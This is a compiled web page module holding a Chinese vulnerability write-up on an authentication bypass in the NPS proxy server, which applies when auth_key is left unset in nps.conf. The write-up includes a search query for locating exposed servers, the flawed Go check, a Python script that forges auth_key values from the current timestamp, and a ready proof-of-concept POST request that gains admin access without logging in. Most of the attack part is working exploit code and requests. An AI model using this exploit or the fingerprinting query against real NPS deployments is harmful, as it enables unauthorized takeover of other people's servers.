import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as i,c as a,e as t}from"./app-58e4a7d6.js";const n={},s=t(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>NPS auth_key 存在未授权访问漏洞，当 nps.conf 中的 auth_key 未配置时攻击者通过生成特定的请求包可以获取服务器后台权限</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>NPS
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>body=&quot;serializeArray()&quot; &amp;&amp; body=&quot;/login/verify&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202208241410172.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>在 web/controllers/base.go 文件中</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202208241412535.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>md5Key := s.getEscapeString(&quot;auth_key&quot;)
timestamp := s.GetIntNoErr(&quot;timestamp&quot;)
configKey := beego.AppConfig.String(&quot;auth_key&quot;)
timeNowUnix := time.Now().Unix()
if !(md5Key != &quot;&quot; &amp;&amp; (math.Abs(float64(timeNowUnix-int64(timestamp))) &lt;= 20) &amp;&amp; (crypt.Md5(configKey+strconv.Itoa(timestamp)) == md5Key)) {
	if s.GetSession(&quot;auth&quot;) != true {
		s.Redirect(beego.AppConfig.String(&quot;web_base_url&quot;)+&quot;/login/index&quot;, 302)
	}
} else {
	s.SetSession(&quot;isAdmin&quot;, true)
	s.Data[&quot;isAdmin&quot;] = true
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这里需要的参数为 配置文件 nps.conf 中的 auth_key 与 timestamp 的md5 形式进行认证，但在默认的配置文件中，auth_key 默认被注释，所以只需要可以获取到的参数 timestamp 就可以登录目标</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202208241413464.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>import time
import hashlib
now = time.time()
m = hashlib.md5()
m.update(str(int(now)).encode(&quot;utf8&quot;))
auth_key = m.hexdigest()

print(&quot;auth_key=%s&amp;timestamp=%s&quot; % (auth_key,int(now)))
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>验证POC</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /client/list
  
search=&amp;order=asc&amp;offset=0&amp;limit=10&amp;auth_key=8c98b1bdedbc569c4e61eeaeb11ce772&amp;timestamp=1659838908
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202208241418775.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,18),d=[s];function r(l,o){return i(),a("div",null,d)}const m=e(n,[["render",r],["__file","NPS auth_key 未授权访问漏洞.html.vue"]]);export{m as default};
